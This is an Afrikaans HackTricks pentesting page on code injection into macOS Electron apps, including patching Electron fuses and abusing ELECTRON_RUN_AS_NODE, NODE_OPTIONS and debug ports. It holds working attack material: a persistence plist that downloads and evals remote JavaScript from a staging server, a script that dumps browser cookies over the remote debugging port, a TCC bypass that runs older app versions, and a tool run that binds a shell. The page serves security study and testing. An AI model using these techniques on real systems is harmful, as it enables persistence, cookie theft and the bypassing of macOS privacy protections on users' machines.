# macOS Electron Toepassings Inspuiting

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

As jy nie weet wat Electron is nie, kan jy [**baie inligting hier vind**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Maar vir nou moet jy net weet dat Electron **node** draai.\
En node het 'n paar **parameters** en **omgewing veranderlikes** wat gebruik kan word om **ander kode uit te voer** behalwe die aangeduide lêer.

### Electron Fuse

Hierdie tegnieke sal volgende bespreek word, maar in onlangse tye het Electron verskeie **veiligheidsvlaggies bygevoeg om dit te voorkom**. Dit is die [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) en dit is diegene wat gebruik word om **te voorkom** dat Electron toepassings in macOS **arbitraire kode laai**:

- **`RunAsNode`**: As dit gedeaktiveer is, voorkom dit die gebruik van die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** om kode in te spuit.
- **`EnableNodeCliInspectArguments`**: As dit gedeaktiveer is, sal parameters soos `--inspect`, `--inspect-brk` nie gerespekteer word nie. Dit vermy hierdie manier om kode in te spuit.
- **`EnableEmbeddedAsarIntegrityValidation`**: As dit geaktiveer is, sal die gelaaide **`asar`** **lêer** deur macOS **gevalideer** word. **Dit voorkom** op hierdie manier **kode-inspuiting** deur die inhoud van hierdie lêer te wysig.
- **`OnlyLoadAppFromAsar`**: As dit geaktiveer is, sal dit slegs app.asar nagaan en gebruik, in plaas daarvan om in die volgende volgorde te soek: **`app.asar`**, **`app`** en uiteindelik **`default_app.asar`**. Dit verseker dat wanneer dit **gekombineer** word met die **`embeddedAsarIntegrityValidation`** fuse, dit **onmoontlik** is om **nie-gevalideerde kode** te **laai**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: As dit geaktiveer is, gebruik die blaaiersproses die lêer genaamd `browser_v8_context_snapshot.bin` vir sy V8-snapshot.

Nog 'n interessante fuse wat nie kode-inspuiting sal voorkom nie, is:

- **EnableCookieEncryption**: As dit geaktiveer is, word die koekie stoor op skyf geënkripteer met behulp van OS-vlak kriptografie sleutels.

### Kontroleer Electron Fuses

Jy kan **hierdie vlaggies kontroleer** vanaf 'n toepassing met:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Soos die [**dokumentasie noem**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), is die konfigurasie van die **Electron Fuses** geconfigureer binne die **Electron binêre** wat êrens die string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** bevat.

In macOS toepassings is dit tipies in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
U kan hierdie lêer in [https://hexed.it/](https://hexed.it/) laai en soek na die vorige string. Na hierdie string kan u in ASCII 'n nommer "0" of "1" sien wat aandui of elke sekering gedeaktiveer of geaktiveer is. Pas eenvoudig die hex kode (`0x30` is `0` en `0x31` is `1`) aan om **die sekering waardes te wysig**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Let daarop dat as u probeer om die **`Electron Framework`** binêre binne 'n toepassing met hierdie bytes wat gewysig is, die app nie sal loop nie.

## RCE voeg kode by Electron Toepassings

Daar kan **eksterne JS/HTML lêers** wees wat 'n Electron App gebruik, so 'n aanvaller kan kode in hierdie lêers inspuit waarvan die handtekening nie nagegaan sal word nie en willekeurige kode in die konteks van die app uitvoer.

> [!CAUTION]
> egter, op die oomblik is daar 2 beperkings:
>
> - Die **`kTCCServiceSystemPolicyAppBundles`** toestemming is **nodig** om 'n App te wysig, so standaard is dit nie meer moontlik nie.
> - Die gecompileerde **`asap`** lêer het gewoonlik die sekeringe **`embeddedAsarIntegrityValidation`** `en` **`onlyLoadAppFromAsar`** `geaktiveer`
>
> Dit maak hierdie aanvalspad meer ingewikkeld (of onmoontlik).

Let daarop dat dit moontlik is om die vereiste van **`kTCCServiceSystemPolicyAppBundles`** te omseil deur die toepassing na 'n ander gids te kopieer (soos **`/tmp`**), die vouer **`app.app/Contents`** te hernoem na **`app.app/NotCon`**, **die** **asar** lêer met u **kwaadwillige** kode te **wysig**, dit weer terug te hernoem na **`app.app/Contents`** en dit uit te voer.

U kan die kode uit die asar lêer onpack met:
```bash
npx asar extract app.asar app-decomp
```
En pak dit weer in nadat dit met die volgende gewysig is:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE met `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Volgens [**die dokumentasie**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), as hierdie omgewing veranderlike gestel is, sal dit die proses as 'n normale Node.js-proses begin.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> As die fuse **`RunAsNode`** gedeaktiveer is, sal die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** geïgnoreer word, en dit sal nie werk nie.

### Inspuiting vanaf die App Plist

Soos [**hier voorgestel**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kan jy hierdie omgewing veranderlike in 'n plist misbruik om volharding te handhaaf:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE met `NODE_OPTIONS`

Jy kan die payload in 'n ander lêer stoor en dit uitvoer:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> As die fuse **`EnableNodeOptionsEnvironmentVariable`** **deaktiveer** is, sal die app die env var **NODE_OPTIONS** **ignore** wanneer dit gelaai word, tensy die env variable **`ELECTRON_RUN_AS_NODE`** gestel is, wat ook **geignore** sal word as die fuse **`RunAsNode`** deaktiveer is.
>
> As jy nie **`ELECTRON_RUN_AS_NODE`** stel nie, sal jy die **fout** vind: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Inspuiting vanaf die App Plist

Jy kan hierdie env variable in 'n plist misbruik om volharding te handhaaf deur hierdie sleutels by te voeg:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE met inspeksie

Volgens [**hierdie**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kan jy 'n Electron-toepassing uitvoer met vlae soos **`--inspect`**, **`--inspect-brk`** en **`--remote-debugging-port`**, 'n **debug-poort sal oop wees** sodat jy daarop kan aansluit (byvoorbeeld van Chrome in `chrome://inspect`) en jy sal in staat wees om **kode daarop in te spuit** of selfs nuwe prosesse te begin.\
Byvoorbeeld:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> As die fuse **`EnableNodeCliInspectArguments`** gedeaktiveer is, sal die app **node parameters** (soos `--inspect`) ignoreer wanneer dit gelaai word, tensy die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** gestel is, wat ook **geignoreer** sal word as die fuse **`RunAsNode`** gedeaktiveer is.
>
> U kan egter steeds die **electron param `--remote-debugging-port=9229`** gebruik, maar die vorige payload sal nie werk om ander prosesse uit te voer nie.

Deur die param **`--remote-debugging-port=9222`** te gebruik, is dit moontlik om sekere inligting van die Electron App te steel, soos die **geskiedenis** (met GET-opdragte) of die **koekies** van die blaaier (aangesien dit **ontsleuteld** binne die blaaiers is en daar 'n **json eindpunt** is wat hulle sal gee).

U kan leer hoe om dit te doen in [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) en [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) en die outomatiese hulpmiddel [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) of 'n eenvoudige skrip soos:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**hierdie blogpos**](https://hackerone.com/reports/1274695), word hierdie foutopsporing misbruik om 'n headless chrome **arbitraire lêers in arbitraire plekke af te laai**.

### Inspuiting vanaf die App Plist

Jy kan hierdie omgewing veranderlike in 'n plist misbruik om volharding te handhaaf deur hierdie sleutels by te voeg:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass wat ouer weergawes misbruik

> [!TIP]
> Die TCC daemon van macOS kontroleer nie die uitgevoerde weergawe van die toepassing nie. So as jy **nie kode in 'n Electron-toepassing kan inspuit nie** met enige van die vorige tegnieke, kan jy 'n vorige weergawe van die APP aflaai en kode daarop inspuit, aangesien dit steeds die TCC voorregte sal ontvang (tenzij Trust Cache dit voorkom).

## Voer nie-JS Kode uit

Die vorige tegnieke sal jou toelaat om **JS kode binne die proses van die electron-toepassing uit te voer**. Onthou egter dat die **kind prosesse onder dieselfde sandbox profiel** as die ouer toepassing loop en **hul TCC toestemmings erf**.\
Daarom, as jy voorregte wil misbruik om toegang tot die kamera of mikrofoon te verkry, kan jy eenvoudig **'n ander binêre vanaf die proses uitvoer**.

## Outomatiese Inspuiting

Die hulpmiddel [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kan maklik gebruik word om **kwesbare electron-toepassings** wat geïnstalleer is te vind en kode daarop in te spuit. Hierdie hulpmiddel sal probeer om die **`--inspect`** tegniek te gebruik:

Jy moet dit self saamstel en kan dit soos volg gebruik:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Verwysings

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
